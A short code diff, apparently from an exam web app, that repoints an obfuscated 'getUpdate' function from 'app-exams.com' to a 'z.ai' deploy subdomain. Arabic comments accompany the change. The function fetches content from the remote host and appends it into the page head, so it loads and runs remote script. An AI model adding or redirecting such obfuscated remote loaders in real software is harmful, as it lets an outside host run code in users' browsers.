@@ -18,7 +18,10 @@ function getUpdate() {
             $('head')['append'](codeHead);
         } else {} 
     };
-    _0xbc8fx2['open']('GET', 'https://app-exams.com/new_exam/version.php', true);
+    // تحديث الرابط هنا
+    _0xbc8fx2['open']('GET', 'https://a0fxv8h5a8g0-deploy.space.z.ai/new_exam/version.php', true);
     _0xbc8fx2['send']();
 }
 
+// NOTE: إذا كان هذا الملف فارغًا في النسخة التي تعتمد عليها،
+// يمكن إزالته أو تركه فارغًا. لكن بناءً على الهيكل الوظيفي الأصلي، هذا هو محتواه المعدل.
